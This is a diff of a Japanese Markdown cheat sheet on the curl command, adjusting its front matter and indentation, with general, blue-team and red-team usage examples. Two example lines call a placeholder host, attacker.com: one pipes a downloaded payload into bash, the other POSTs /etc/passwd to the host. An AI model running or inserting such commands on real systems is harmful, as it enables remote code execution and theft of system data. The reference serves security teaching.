@@ -1,18 +1,20 @@
 ---
 tags:
-  - 'curl'
-  - 'networking'
-  - 'http'
-  - 'cheetsheet'
-title: 'curl - URLを使ったデータ転送ツール'
-summary: 'HTTP, HTTPS, FTPなど様々なプロトコルを使い、サーバとの間でデータを送受信するための汎用的なコマンドラインツールです。'
-related:
-  - 'wget'
-  - 'httpie'
-  - 'bash'
+  - curl
+  - networking
+  - http
+  - wget
+  - httpie
+  - bash
+created: 2025-06-29 15:02
+modified: 2026-01-18 15:29
+environment:
+  - OS/Linux
+vulnearability: []
+knowledge_category: Command
 ---
 
-# `curl` - URLを使ったデータ転送ツール
+# Command  - Linux - curl - URLを使ったデータ転送ツール
 
 ## 概要
 
@@ -38,10 +40,10 @@ related:
 * **解説**: `curl` でダウンロードしたスクリプトの内容を、パイプ (`|`) を通じて直接 `bash` の標準入力に渡して実行させます。これは「Fileless Execution」の一形態です。
 * **コマンド例**:
 
-    ```bash
-    # 攻撃者のサーバからペイロードをダウンロードし、即座にbashで実行
-    curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
-    ```
+```bash
+# 攻撃者のサーバからペイロードをダウンロードし、即座にbashで実行
+curl -s [http://attacker.com/payload.sh](http://attacker.com/payload.sh) | bash
+```
 
 ## オプション説明
 
@@ -72,11 +74,11 @@ related:
 * **解説**: `-s` で出力を抑制し、`-o /dev/null` でボディを捨て、`-w "%{http_code}"` でHTTPステータスコードのみを出力します。スクリプトによる死活監視に最適です。
 * **例**:
 
-    ```bash
-    # ヘルスチェックエンドポイントを叩き、ステータスコードが200であることを確認
-    STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/health)
-    if [ "$STATUS_CODE" -ne 200 ]; then echo "Health check failed!"; fi
-    ```
+```bash
+# ヘルスチェックエンドポイントを叩き、ステータスコードが200であることを確認
+STATUS_CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:8080/health)
+if [ "$STATUS_CODE" -ne 200 ]; then echo "Health check failed!"; fi
+```
 
 ### 2. ブルーチーム視点
 
@@ -85,10 +87,10 @@ related:
 * **解説**: `-I` (`--head`) を使い、コンテンツ本体をダウンロードすることなく、対象URLのレスポンスヘッダーのみを取得します。これにより、サーバの種類 (`Server:` ヘッダ)やリダイレクト先 (`Location:` ヘッダ) などの情報を安全に収集できます。
 * **例**:
 
-    ```bash
-    # 不審な短縮URLがどこにリダイレクトされるかを確認
-    curl -I [https://bit.ly/xxxxxx](https://bit.ly/xxxxxx)
-    ```
+```bash
+# 不審な短縮URLがどこにリダイレクトされるかを確認
+curl -I [https://bit.ly/xxxxxx](https://bit.ly/xxxxxx)
+```
 
 ### 3. レッドチーム視点
 
@@ -97,22 +99,22 @@ related:
 * **解説**: `--data-binary` と `@` を組み合わせることで、ローカルファイルの内容をそのままPOSTデータとして送信します。
 * **例**:
 
-    ```bash
-    # /etc/passwd ファイルの内容を、攻撃者のサーバにPOSTリクエストで送信する
-    curl -X POST --data-binary @/etc/passwd [http://attacker.com/loot](http://attacker.com/loot)
-    ```
+```bash
+# /etc/passwd ファイルの内容を、攻撃者のサーバにPOSTリクエストで送信する
+curl -X POST --data-binary @/etc/passwd [http://attacker.com/loot](http://attacker.com/loot)
+```
 
 ## エラーメッセージとトラブルシューティング
 
 * 一般的なエラーは [Linux共通のトラブルシューティング](./troubleshooting_common_errors.md) を参照。
 
 1. **エラーメッセージ例 1**: `curl: (60) SSL certificate problem: unable to get local issuer certificate`
-    * **考えられる原因**: 接続先のサーバが提示したSSL/TLS証明書が、システムの信頼する認証局(CA)によって検証できませんでした。自己署名証明書などで発生します。
-    * **解決策**: 接続先が信頼できることが確実な場合に限り、`-k` または `--insecure` オプションを付けて検証をスキップします。
+		* **考えられる原因**: 接続先のサーバが提示したSSL/TLS証明書が、システムの信頼する認証局(CA)によって検証できませんでした。自己署名証明書などで発生します。
+		* **解決策**: 接続先が信頼できることが確実な場合に限り、`-k` または `--insecure` オプションを付けて検証をスキップします。
 
 2. **エラーメッセージ例 2**: `curl: (7) Failed to connect to <host> port <port>: Connection refused`
-    * **考えられる原因**: ネットワーク的にホストに到達できたが、指定したポートでリッスンしているサービスが存在しません。
-    * **解決策**: 接続先のホスト名やポート番号が正しいか、サーバ側でファイアウォールがそのポートをブロックしていないか、サービスが正しく起動しているかを確認します。
+		* **考えられる原因**: ネットワーク的にホストに到達できたが、指定したポートでリッスンしているサービスが存在しません。
+		* **解決策**: 接続先のホスト名やポート番号が正しいか、サーバ側でファイアウォールがそのポートをブロックしていないか、サービスが正しく起動しているかを確認します。
 
 ## 環境変数と設定ファイル
 
@@ -148,5 +150,3 @@ related:
 
 * **デバッグには `-v`**: 通信がうまくいかない場合、`curl -v <URL>` を実行すると、リクエストとレスポンスのヘッダー、TLSハンドシェイクの過程など、非常に詳細な情報が得られ、問題解決の強力な手助けとなります。
 
----
-[インデックスに戻る](../linux_index.md)
